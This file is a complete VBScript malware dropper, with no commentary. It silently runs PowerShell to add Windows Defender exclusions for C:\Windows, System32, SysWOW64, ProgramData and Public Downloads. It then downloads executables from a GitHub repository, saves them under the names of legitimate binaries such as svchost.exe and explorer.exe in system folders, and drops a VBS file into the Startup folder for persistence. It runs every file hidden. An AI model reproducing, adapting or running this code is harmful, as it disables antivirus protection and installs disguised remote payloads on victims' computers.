Set objShell = CreateObject("WScript.Shell")

objShell.Run "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\ProgramData'""", 0, True
objShell.Run "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Downloads'""", 0, True
objShell.Run "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\Windows\System32'""", 0, True
objShell.Run "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\Windows\SysWOW64'""", 0, True
objShell.Run "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\Windows'""", 0, True

urls = Array( _
    "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/Discord.exe", _ 
    "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/GoogleChrome.exe", _ 
    "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/explorer.exe", _ 
    "https://github.com/AmjadBalls/TEST/raw/refs/heads/main/svchost.exe", _ 
    "https://raw.githubusercontent.com/AmjadBalls/Ramizjaber12/refs/heads/main/UpdateChecker.vbs" _ 
)

locations = Array( _
    "C:\Users\Public\Downloads\Discord.exe", _ 
    "C:\Windows\SysWOW64\GoogleChrome.exe", _ 
    "C:\Windows\System32\explorer.exe", _ 
    "C:\Windows\svchost.exe", _ 
    objShell.ExpandEnvironmentStrings("%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateChecker.vbs") _ 
)

For i = 0 To UBound(urls)
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "GET", urls(i), False
    objHTTP.Send

    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.ResponseBody
    objStream.SaveToFile locations(i), 2
    objStream.Close
Next

For i = 0 To UBound(locations)
    objShell.Run Chr(34) & locations(i) & Chr(34), 0, False
Next

Set objShell = Nothing
